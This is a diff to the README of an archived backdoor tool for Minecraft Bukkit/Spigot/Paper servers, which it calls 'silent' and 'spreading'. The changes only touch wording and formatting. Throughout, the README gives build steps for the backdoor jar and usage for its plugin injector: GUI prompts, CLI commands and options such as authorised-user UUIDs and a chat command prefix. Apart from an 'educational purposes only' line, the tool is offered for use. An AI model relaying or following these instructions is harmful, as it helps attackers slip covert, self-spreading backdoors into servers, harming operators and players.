@@ -4,7 +4,7 @@
 # For educational purposes only. Do not attempt to install on a server you do not own.
 
 A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
-Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.
+Using the injector **highly** is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.
 
 This is an archived repo, no support will be offered, and no bugs will be fixed.
 
@@ -21,7 +21,7 @@ mvn clean package
 After you have pasted it in the terminal click enter and wait until it finishes compiling.
 A "target" directory should appear on the left bar, click on it.
 The files inside should be some folders and 2 jar files, Original-backdoor(Version).jar, and backdoor(Version).jar.
-right click on either one and download it.
+right click on either one and click on download.
 
 ## GUI Usage:
 * Run backdoor-(version).jar.
@@ -30,8 +30,9 @@ right click on either one and download it.
 * Input chat command prefix. (Default: #)
 
 ## CLI Usage:
-Windows: Java -jar backdoor.jar (filename) [options]
-Linux: sudo java -jar backdoor.jar (filename) [options]
+Windows: ```java -jar backdoor.jar (filename) [options]```
+
+Linux: ```sudo java -jar backdoor.jar (filename) [options]```
 * --help / -h : Display syntax message in console
 * --offline / -o : Use usernames instead of UUID
 * --users / -u : UUID's or Usernames of authorized users. If not used, all users will be allowed.
@@ -104,4 +105,4 @@ Other strange behavior may occur when teleporting extreme distances. (such as to
 This software is provided under the GPL3 License.
 
 Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
-Thanks to @DarkReaper231 for additional features.
+Thanks to **@DarkReaper231** for the additional features.
